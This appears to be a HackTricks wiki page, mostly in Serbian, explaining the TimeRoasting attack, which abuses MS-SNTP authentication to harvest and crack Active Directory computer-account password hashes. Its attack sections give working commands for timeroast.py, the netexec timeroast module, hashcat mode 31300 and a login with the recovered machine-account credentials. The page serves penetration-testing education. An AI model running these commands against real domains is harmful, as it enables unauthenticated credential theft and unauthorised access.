# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting zloupotrebljava legacy MS-SNTP authentication extension. U MS-SNTP, klijent može poslati 68-bajtni zahtev koji ugrađuje bilo koji computer account RID; domain controller koristi computer account-ov NTLM hash (MD4) kao ključ da izračuna MAC nad odgovorom i vrati ga. Napadači mogu prikupiti ove MS-SNTP MACs neautentifikovano i crack them offline (Hashcat mode 31300) da bi povratili lozinke computer account-a.

Vidi sekciju 3.1.5.1 "Authentication Request Behavior" i 4 "Protocol Examples" u zvaničnom MS-SNTP spec za detalje.
![](../../images/Pasted%20image%2020250709114508.png)
Kada je ExtendedAuthenticatorSupported ADM element false, klijent šalje 68-bajtni zahtev i ugrađuje RID u 31 najmanje značajnih bita Key Identifier podpolja authenticator-a.

> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.

Iz sekcije 4 (Protocol Examples):

> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.

Crypto-checksum je zasnovan na MD5 (see 3.2.5.1.1) i može biti cracked offline, što omogućava roasting attack.

## Kako napasti

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts by Tom Tervoort
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Praktični napad (unauth) sa NetExec + Hashcat

- NetExec može da enumeriše i prikupi MS-SNTP MACs za computer RIDs unauthenticated i ispiše $sntp-ms$ hashes spremne za cracking:
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline pomoću Hashcat mode 31300 (MS-SNTP MAC):
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Oporavljeni cleartext odgovara lozinki computer account. Pokušajte ga direktno koristiti kao machine account koristeći Kerberos (-k) kada je NTLM onemogućen:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Operativni saveti
- Obezbedite tačnu sinhronizaciju vremena pre Kerberos-a: `sudo ntpdate <dc_fqdn>`
- Po potrebi, generišite krb5.conf za AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Kasnije mapirajte RIDs na principals putem LDAP/BloodHound kada imate bilo kakav autentifikovani pristup.

## Reference

- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [NetExec – official docs](https://www.netexec.wiki/)
- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
